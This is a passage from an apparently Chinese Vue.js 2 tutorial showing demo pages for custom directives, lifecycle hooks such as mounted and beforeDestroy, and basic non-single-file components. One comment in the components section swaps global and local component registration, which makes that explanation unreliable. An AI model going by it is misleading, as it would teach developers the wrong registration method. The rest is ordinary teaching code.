     <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-fbind:value</span>=<span class="string">&quot;n&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root2&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 使用全局指令 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-fbind:value</span>=<span class="string">&quot;n&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//定义全局指令</span></span></span><br><span class="line"><span class="javascript">    Vue.directive(<span class="string">&#x27;fbind&#x27;</span>,&#123;</span></span><br><span class="line"><span class="javascript">         <span class="comment">//指令与元素成功绑定时被调用</span></span></span><br><span class="line"><span class="javascript">         <span class="function"><span class="title">bind</span>(<span class="params">element,binding</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;bind&#x27;</span>)</span></span><br><span class="line">            element.value = binding.value</span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">//指令所在元素被插入页面时被调用</span></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">inserted</span>(<span class="params">element,binding</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;inserted&#x27;</span>)</span></span><br><span class="line">            element.focus()</span><br><span class="line">        &#125;,        </span><br><span class="line"><span class="javascript">        <span class="comment">//指令所在的模板被重新解析时被调用</span></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">update</span>(<span class="params">element,binding</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;update&#x27;</span>)</span></span><br><span class="line">            element.value = binding.value</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line">            n:1,</span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">//定义局部指令</span></span></span><br><span class="line">        directives:&#123;</span><br><span class="line"><span class="javascript">            <span class="comment">//函数式（普通写法）</span></span></span><br><span class="line">            /**</span><br><span class="line"><span class="javascript">            <span class="string">&#x27;big-number&#x27;</span>:<span class="function"><span class="keyword">function</span>(<span class="params">element,binding</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">//    console.log(element,binding.value) //element是真实DOM标签，binding是真实DOM标签的属性对象</span></span></span><br><span class="line"><span class="javascript">                element.innerText = binding.value * <span class="number">10</span> <span class="comment">//将绑定的值乘以10放入DOM中</span></span></span><br><span class="line">            &#125;,</span><br><span class="line">            */</span><br><span class="line"><span class="javascript">            <span class="comment">//函数式（简写）</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//big函数何时被调用？1.指令与元素成功绑定时。2.指令所在的模板被重新解析时。</span></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">big</span>(<span class="params">element,binding</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">//    console.log(element,binding.value) //element是真实DOM标签，binding是真实DOM标签的属性对象</span></span></span><br><span class="line"><span class="javascript">                element.innerText = binding.value * <span class="number">10</span> <span class="comment">//将绑定的值乘以10放入DOM中</span></span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="javascript">            <span class="comment">//对象式式指令</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// fbind:&#123;</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//     //指令与元素成功绑定时被调用</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//     bind(element,binding)&#123;</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//         console.log(&#x27;bind&#x27;)</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//         element.value = binding.value</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//     &#125;,</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//     //指令所在元素被插入页面时被调用</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//     inserted(element,binding)&#123;</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//         console.log(&#x27;inserted&#x27;)</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//         element.focus()</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//     &#125;,</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//     //指令所在的模板被重新解析时被调用</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//     update(element,binding)&#123;</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//         console.log(&#x27;update&#x27;)</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//         element.value = binding.value</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//     &#125;</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// &#125;</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root2&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line">            n:5,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="39-引出Vue生命周期"><a href="#39-引出Vue生命周期" class="headerlink" title="39.引出Vue生命周期"></a>39.引出Vue生命周期</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>引出Vue生命周期<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">        生命周期：</span></span><br><span class="line"><span class="comment">            1.又名：生命周期回调函数、生命周期函数、生命周期钩子；</span></span><br><span class="line"><span class="comment">            2.是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数；</span></span><br><span class="line"><span class="comment">            3.生命周期函数的名字不可更改，但函数体的内容是程序员根据需求编写的；</span></span><br><span class="line"><span class="comment">            4.生命周期函数的this指向的是 vm 或 组件实例对象；</span></span><br><span class="line"><span class="comment">     --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 绑定style样式 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;h2 :style=&quot;&#123;opacity: opacity&#125;&quot;&gt;欢迎学习Vue&lt;/h2&gt; --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 重名可以简写 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span> <span class="attr">:style</span>=<span class="string">&quot;&#123;opacity&#125;&quot;</span>&gt;</span>欢迎学习Vue<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line">   </span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line">            opacity: 1, </span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line">            </span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">//Vue完成模板解析并把初始的真实DOM元素放入页面后（这个过程称为完成挂载）调用mounted()函数（只调用一次）</span></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">mounted</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;mounted&#x27;</span>)</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 设置定时器(推荐)</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">setInterval</span>(<span class="function">()=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span>(<span class="built_in">this</span>.opacity &lt;= <span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">this</span>.opacity = <span class="number">1</span></span></span><br><span class="line">                &#125;</span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.opacity -= <span class="number">0.01</span></span></span><br><span class="line">            &#125;,15)</span><br><span class="line"></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// 设置定时器(通过外部定时器实现，不推荐)</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// setInterval(()=&gt;&#123;</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//     if(vm.opacity &lt;= 0)&#123;</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//         vm.opacity = 1</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//     &#125;</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//     vm.opacity -= 0.01</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// &#125;,20)</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="40-分析Vue生命周期"><a href="#40-分析Vue生命周期" class="headerlink" title="40.分析Vue生命周期"></a>40.分析Vue生命周期</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>分析Vue生命周期<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">        </span></span><br><span class="line"><span class="comment">     --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>当前的n值是：&#123;&#123;n&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;add&quot;</span>&gt;</span>点我n+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;bye&quot;</span>&gt;</span>点我销毁vm<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line">   </span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line">           n: 1, </span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">add</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.n++</span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">bye</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">&#x27;bye&#x27;</span>)</span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.$destroy()<span class="comment">//销毁Vue实例</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">beforeCreate</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 此时无法通过vm访问到data中的数据和methods中的方法。</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;beforeCreate&#x27;</span>)</span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">created</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">             <span class="comment">// 此时可以通过vm访问到data中的数据和methods中配置的方法。</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;created&#x27;</span>)</span></span><br><span class="line"><span class="javascript">            <span class="comment">// console.log(this)</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// 调试断点</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// debugger</span></span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">beforeMount</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 此时页面呈现的是未经Vue编译的DOM结构，所有对DOM的操作最终都不奏效。</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;beforeMount&#x27;</span>)</span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">//Vue完成模板解析并把初始的真实DOM元素放入页面后（这个过程称为完成挂载）调用mounted()函数（只调用一次）</span></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">mounted</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">             <span class="comment">// 此时页面呈现的是经Vue编译过的DOM结构，所有对DOM的操作均奏效（尽可能避免）。</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//  至此初始化过程结束，一般在此进行：开启定时器、发送网络请求、订阅消息、绑定自定义事件等初始化操作。</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;mounted&#x27;</span>)</span></span><br><span class="line">            </span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">beforeUpdate</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 此时数据是新的，但页面是旧的。即：页面尚未和数据保持同步。</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;beforeUpdate&#x27;</span>)</span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">updated</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">             <span class="comment">// 此时数据是新的，页面也是新的。即：页面和数据保持同步。</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;updated&#x27;</span>)</span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">beforeDestroy</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 此时vm中所有的data、methods、指令等等，都处于可用状态，马上要执行销毁过程。</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// 一般在此进行：关闭定时器、取消消息订阅、解绑自定义事件等收尾操作。</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;beforeDestroy&#x27;</span>)</span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">destroyed</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;destroyed&#x27;</span>)</span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="41-总结Vue生命周期"><a href="#41-总结Vue生命周期" class="headerlink" title="41.总结Vue生命周期"></a>41.总结Vue生命周期</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>总结Vue生命周期<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">        常用的生命周期钩子：</span></span><br><span class="line"><span class="comment">            1.mounted：开启定时器、发送ajax请求、订阅消息、绑定自定义事件等初始化操作。</span></span><br><span class="line"><span class="comment">            2.beforeDestroy：清除定时器、取消消息订阅、解绑自定义事件等收尾操作。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        关于销毁Vue实例：</span></span><br><span class="line"><span class="comment">            1.销毁后借助Vue开发者工具看不到任何信息；</span></span><br><span class="line"><span class="comment">            2.销毁后自定义事件会失效，但原生DOM事件任然有效；</span></span><br><span class="line"><span class="comment">            3.一般不会在beforeDestroy里操作数据，因为即便操作数据，也不会再触发更新流程了；</span></span><br><span class="line"><span class="comment">     --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span> <span class="attr">:style</span>=<span class="string">&quot;&#123;opacity&#125;&quot;</span>&gt;</span>欢迎学习Vue<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;stop()&quot;</span>&gt;</span>点我终止变换<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line">   </span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line">            opacity: 1, </span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">stop</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.$destroy()<span class="comment">//模拟vm被销毁，调用beforeDestroy()生命周期函数，做一些善后工作，比如：清除定时器等</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">//Vue完成模板解析并把初始的真实DOM元素放入页面后（这个过程称为完成挂载）调用mounted()函数（只调用一次）</span></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">mounted</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;mounted&#x27;</span>)</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 设置定时器,并将定时器id赋值给vm的timer属性</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">this</span>.timer = <span class="built_in">setInterval</span>(<span class="function">()=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span>(<span class="built_in">this</span>.opacity &lt;= <span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">this</span>.opacity = <span class="number">1</span></span></span><br><span class="line">                &#125;</span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.opacity -= <span class="number">0.01</span></span></span><br><span class="line">            &#125;,15)</span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">beforeDestroy</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;beforeDestroy做一些善后工作&#x27;</span>)</span></span><br><span class="line"><span class="javascript">            <span class="built_in">clearInterval</span>(<span class="built_in">this</span>.timer)<span class="comment">//清除指定id定时器</span></span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="42-非单文件组件（基本使用）"><a href="#42-非单文件组件（基本使用）" class="headerlink" title="42.非单文件组件（基本使用）"></a>42.非单文件组件（基本使用）</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>非单文件组件（基本使用）<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">        Vue中使用组件的三大步骤：</span></span><br><span class="line"><span class="comment">            1.定义组件（创建组件）</span></span><br><span class="line"><span class="comment">            2.注册组件</span></span><br><span class="line"><span class="comment">            3.使用组件（写组件标签）</span></span><br><span class="line"><span class="comment">        一、如何定义一个组件？</span></span><br><span class="line"><span class="comment">            使用Vue.extend(options)创建，其中options和new Vue(options)时传入的options几乎一样，</span></span><br><span class="line"><span class="comment">            但区别如下：</span></span><br><span class="line"><span class="comment">                1.el不要写，为什么？——最终所有的组件都要经过一个vm管理，由vm中的el决定组件服务于那个容器。</span></span><br><span class="line"><span class="comment">                2.data必须写成函数，为什么？——避免组件被复用时，数据存在引用关系。</span></span><br><span class="line"><span class="comment">                备注：使用template可以配置组件结构；</span></span><br><span class="line"><span class="comment">        二、如何注册组件？</span></span><br><span class="line"><span class="comment">            1.全局注册：靠new Vue()的时候传入components选项；</span></span><br><span class="line"><span class="comment">            2.局部注册：靠Vue.component(&#x27;组件名&#x27;，组件)；</span></span><br><span class="line"><span class="comment">        三、编写组件标签：</span></span><br><span class="line"><span class="comment">            &lt;school&gt;&lt;/school&gt;</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;msg&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hello</span>&gt;</span><span class="tag">&lt;/<span class="name">hello</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--  第三步：编写组件标签 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">school</span>&gt;</span><span class="tag">&lt;/<span class="name">school</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--  第三步：编写组件标签 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">student</span>&gt;</span><span class="tag">&lt;/<span class="name">student</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 体现复用组件 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">student</span>&gt;</span><span class="tag">&lt;/<span class="name">student</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root2&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hello</span>&gt;</span><span class="tag">&lt;/<span class="name">hello</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// 第一步：创建school组件</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> school = Vue.extend(&#123;</span></span><br><span class="line">        template:`</span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名字：</span><span class="template-variable">&#123;&#123;<span class="name">schoolName</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：</span><span class="template-variable">&#123;&#123;<span 